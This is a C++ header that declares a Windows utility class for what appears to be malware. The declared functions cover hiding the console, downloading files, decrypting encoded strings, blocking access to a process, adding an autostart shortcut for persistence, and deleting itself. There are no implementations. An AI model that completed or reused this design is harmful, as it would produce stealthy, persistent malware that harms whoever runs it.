#include <windows.h>
#include <Aclapi.h>
#include "Sddl.h"
#include <io.h>
#include <direct.h>
#include <iostream>
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <tchar.h>
#pragma comment (lib, "urlmon.lib")

using namespace std;

class Utils
{
public:
	void HideConsole();
	bool FileExists(const char *fname);
	void DownloadFile(wchar_t *url, wchar_t *dir);
	void CreateDir(wchar_t *dir);
	int getCPU();
	char* UnEnc(char *enc, char *key, DWORD encLen);
	BOOL DenyAccessToId(DWORD pId);
	DWORD FindProcessId(const std::wstring& processName);
	void createAutoLoadShortcut(string fpath);
	bool IsProcessRunning(const wchar_t *processName);
	string getProcessName(DWORD pId);
	string getCurrentWorkDir();
	void Suicide();
};